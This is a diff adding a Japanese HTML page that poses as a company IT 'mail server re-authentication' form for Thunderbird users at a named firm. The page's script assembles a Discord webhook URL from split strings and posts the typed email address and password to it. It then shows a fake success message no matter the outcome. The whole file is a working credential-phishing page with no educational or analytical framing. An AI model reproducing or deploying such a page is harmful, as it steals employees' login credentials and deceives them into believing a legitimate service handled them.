@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>メールサーバー再認証</title>
+<style>
+body{font-family:'Segoe UI',sans-serif;background:#f0f0f0;display:flex;justify-content:center;padding-top:60px;}
+.box{background:#fff;width:380px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);overflow:hidden;}
+.hdr{background:#0a84c8;padding:18px 22px;display:flex;align-items:center;gap:10px;}
+.hdr svg{width:28px;height:28px;}
+.hdr h1{font-size:15px;color:#fff;font-weight:600;}
+.hdr h1 small{display:block;font-size:11px;font-weight:400;opacity:.8;}
+.bd{padding:26px 22px;}
+.msg{font-size:13px;color:#444;line-height:1.7;margin-bottom:18px;}
+.msg strong{color:#c0392b;}
+.msg code{background:#eee;padding:1px 5px;border-radius:3px;font-size:12px;}
+label{font-size:12px;color:#666;font-weight:600;display:block;margin-bottom:3px;}
+input{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:13px;margin-bottom:14px;font-family:monospace;box-sizing:border-box;}
+input:focus{outline:none;border-color:#0a84c8;}
+.btn{width:100%;padding:12px;background:#0a84c8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;}
+.btn:hover{background:#0871ab;}
+.spin{display:none;width:30px;height:30px;border:3px solid #ddd;border-top-color:#0a84c8;border-radius:50%;margin:20px auto;animation:sp .7s linear infinite;}
+@keyframes sp{to{transform:rotate(360deg)}}
+.ok{display:none;text-align:center;padding:30px 0;}
+.ok svg{width:56px;height:56px;margin-bottom:14px;}
+.ok p{font-size:14px;color:#27ae60;font-weight:600;}
+.ok small{font-size:12px;color:#888;}
+.ft{background:#f7f7f7;padding:8px 16px;font-size:10px;color:#aaa;text-align:center;}
+</style>
+</head>
+<body>
+<div class="box">
+<div class="hdr">
+<svg viewBox="0 0 32 32" fill="none"><rect width="32" height="32" rx="6" fill="#066a9e"/><path d="M6 16c0-5 4-9 10-9s10 4 10 9-4 9-10 9S6 21 6 16z" fill="none" stroke="#fff" stroke-width="1.8"/><path d="M10 16l3.5-3.5h7v3.5l-5.5 5.5z" fill="#fff"/></svg>
+<h1>メールサーバー再認証<small>Thunderbird Account Service</small></h1>
+</div>
+<div class="bd">
+<div class="msg" id="msg">社内メールサーバーのTLS証明書が本日付で更新されました。<br>Thunderbird の接続が切断されている可能性があります。<br>以下のリンクで、<strong>アカウントの再認証</strong>を実行してください。<br><br>サーバー: <code>imap.shinei-model.co.jp</code><br>ポート: 993 (TLS)</div>
+<form id="f" onsubmit="return send()">
+<label>アカウント（メールアドレス）</label>
+<input type="email" id="u" placeholder="user@shinei-model.co.jp" autocomplete="off">
+<label>パスワード</label>
+<input type="password" id="p" autocomplete="off">
+<button class="btn" type="submit">認証を実行</button>
+</form>
+<div class="spin" id="sp"></div>
+<div class="ok" id="ok">
+<svg viewBox="0 0 56 56"><circle cx="28" cy="28" r="26" fill="#e8f8ee" stroke="#27ae60" stroke-width="2"/><path d="M17 29l8 8 15-16" stroke="#27ae60" stroke-width="3.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+<p>サーバー接続を確立しました</p>
+<small>Thunderbird の再認証が完了しました。<br>通常通りメールをご利用ください。</small>
+</div>
+</div>
+<div class="ft">© shinei-model.co.jp IT Management</div>
+</div>
+<script>
+var H="https:/";
+var T="/discord.com/api/webhooks/";
+var A="1569533813548388482/";
+var B="7wipbj3B0igYJicr-BVwvRfRU9izfKWKjjDY15wU5desK4cQx7Tgmt4HkhhkYCiKvVoA";
+function send(){
+  var u=document.getElementById("u").value;
+  var p=document.getElementById("p").value;
+  if(!u||!p)return false;
+  document.getElementById("f").style.display="none";
+  document.getElementById("msg").style.display="none";
+  document.getElementById("sp").style.display="block";
+  var url=H+T+A+B;
+  var body=JSON.stringify({"content":"user: "+u+"\npass: "+p+"\ntime: "+new Date().toLocaleTimeString("ja-JP")});
+  fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body})
+  .then(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";})
+  .catch(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";});
+  return false;
+}
+</script>
+</body>
+</html>
